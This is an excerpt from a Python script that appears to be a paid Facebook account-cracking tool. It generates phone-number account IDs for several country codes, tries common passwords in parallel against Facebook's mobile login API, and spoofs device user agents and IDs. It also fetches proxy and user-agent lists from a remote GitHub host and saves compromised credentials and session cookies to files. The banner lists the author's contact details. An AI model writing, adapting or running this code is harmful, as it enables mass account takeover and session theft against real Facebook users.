...
try:
    prox= requests.get('https://raw.githubusercontent.com/SHAKIL-FC/BEST-CLONE-XD/main/proxies.txt').text
...
android_models=[]
try:
    xx = requests.get('https://raw.githubusercontent.com/SHAKIL-FC/BEST-CLONE-XD/main/strings.txt').text.splitlines()
    for line in xx:
...
usr=[]
try:
    xd=requests.get('https://raw.githubusercontent.com/SHAKIL-FC/BEST-CLONE-XD/main/ua.txt').text.splitlines()
    for us in xd:
        usr.append(us)
except: pass
...
for nt in range(10000):
    ...
    rx=random.randrange(1, 999) #Md Shakil Islam
...
███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║██║██║ ╚████║╚██████╔╝
╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝ ╚═════╝                                
\033[92;1m══════════════════════════════════════════════════ \033[1;91m[\033[1;94m0.3\033[1;91m]
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK  : 𝐌𝐃 𝐒𝐇𝐀𝐊𝐈𝐋 𝐈𝐒𝐋𝐀𝐌
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mSTATUS    : 𝐏𝐀𝐈𝐃 𝐓𝐎𝐎𝐋𝐒
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB    : 𝐒𝐇𝐀𝐊𝐈𝐋-𝐅𝐂
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWHATSAPP  : +𝟖𝟖𝟎𝟏𝟔𝟎𝟖𝟓𝟑𝟎𝟔𝟔𝟒      
\033[92;1m══════════════════════════════════════════════════""")
def linex():
    print('\033[92;1m--------------------------------------------------')
...
def menu():
                ...
                if x == ("***"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' PUT FILE EXAMPLE :  /sdcard/File.SHAKIL.etc..')
                                linex()
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as SHAKIL:     
                        clear()
                        ...
                        for psx in user:
                                ...
                                SHAKIL.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED') #Md Shakil Islam
                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                linex()
                input(' PRESS ENTER TO BACK ')
                os.system('python SCANNING.py')
def bd():
                ...
                with tred(max_workers=30) as SHAKIL:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'rehena','iloveyou','jannati','freefire','shakil']
                                SHAKIL.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
...
def afg():
                ...
                with tred(max_workers=30) as SHAKIL:     
                        ...
                        print('[+] Process has been started \033[1;97m')
                        linex()
                        for psx in user: #Md Shakil Islam
                                ids = code+psx
...
def ind():
                user=[]
                clear()
                print('\033[1;31m CODE EXAMPLE : +91620 | +91629 ')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
                ...
                with tred(max_workers=30) as SHAKIL:     
                        ...
                        tl = str(len(user))
                        print('[+] Total accounts: \033[92;1m'+tl)
                        print('[+] Select code: \033[92;1m '+code)
                        print('[+] Process has been started \033[92;1m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'57273200','57575751','59039200','hindustan']
                                SHAKIL.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' THE PROCESS HAS COMPLETED')
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [SCANNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/EMA;FBLC/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/416.0.0.35.85;FBBV/477796829;FBDM/{density=1.875,width=720,height=1465};FBLC/en_GB;FBRV/480639937;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M127G;FBSV/13;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]"
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [SCANNING-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                       # print("\r\r\033[1;32m Cookie: "+coki)
                                        open('/sdcard/SCANNING-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SCANNING-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                #print('\r\r \033[1;34m[SCANNING-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [SCANNING-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SCANNING-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/SCANNING-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/EMA;FBLC/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/412.0.0.22.115;FBBV/468774598;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBRV/0;FBCR/AirTel;FBMF/lephone;FBBD/lephone;FBPN/com.facebook.katana;FBDV/lephone_W7R;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"                     
...
def api1(ids,names,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [SCANNING-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/435.0.0.42.112;FBBV/523162149;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/526298101;FBCR/JIO;FBMF/GIONEE;FBBD/GIONEE;FBPN/com.facebook.katana;FBDV/P7 Max;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [SCANNING-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SCANNING-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SCANNING-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [SCANNING-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SCANNING-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m[SCANNING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua  = "[FBAN/Orca-Android;FBAV/383.0.0.14.110;FBPN/com.facebook.orca;FBLC/en_US;FBBV/409539503;FBCR/Vi India;FBMF/vivo;FBBD/vivo;FBDV/vivo 1929;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1379};FB_FW/1;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("Cookie: "+coki)
                                        open('/sdcard/SCANNING-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/SCANNING-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
